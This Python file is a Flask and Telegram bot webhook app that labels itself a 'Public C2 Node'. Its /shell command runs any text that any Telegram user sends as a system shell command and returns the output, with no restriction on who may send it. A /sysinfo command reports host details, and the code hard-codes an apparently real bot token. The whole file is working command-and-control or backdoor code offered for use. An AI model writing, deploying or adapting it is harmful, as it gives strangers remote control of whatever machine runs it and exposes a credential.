import os
import subprocess
from flask import Flask, request
import telebot

TOKEN = "8618728444:AAGTHl35WhJ5vA0MzxZajt4ynOIy_rajhMo"
RENDER_EXTERNAL_URL = os.getenv("RENDER_EXTERNAL_URL")

bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@app.route("/")
def index():
    return "[+] Public Bot Node Online.", 200

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    help_text = (
        "[+] Public C2 Node Active\n\n"
        "/shell <cmd> - Execute system command\n"
        "/sysinfo - Get basic environment info"
    )
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['shell'])
def handle_shell(message):
    # No ID restriction — open to anyone
    command = message.text.replace("/shell", "").strip()
    if not command:
        bot.reply_to(message, "[-] No command provided.")
        return

    try:
        output = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=10
        )
        result = output.stdout + output.stderr
        if not result:
            result = "[+] Executed with no output."
    except Exception as e:
        result = f"[-] Error: {str(e)}"

    if len(result) > 4000:
        result = result[:4000] + "\n[Truncated]"

    bot.reply_to(message, f"```\n{result}\n```", parse_mode="Markdown")

@bot.message_handler(commands=['sysinfo'])
def handle_sysinfo(message):
    uname_info = os.uname() if hasattr(os, 'uname') else "Windows Environment"
    cwd = os.getcwd()
    info = f"[*] Environment: {uname_info}\n[*] Working Dir: {cwd}"
    bot.reply_to(message, info)

if __name__ == "__main__":
    if RENDER_EXTERNAL_URL:
        bot.remove_webhook()
        bot.set_webhook(url=f"{RENDER_EXTERNAL_URL}/{TOKEN}")
        print(f"[+] Webhook set to: {RENDER_EXTERNAL_URL}/{TOKEN}")

    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
    
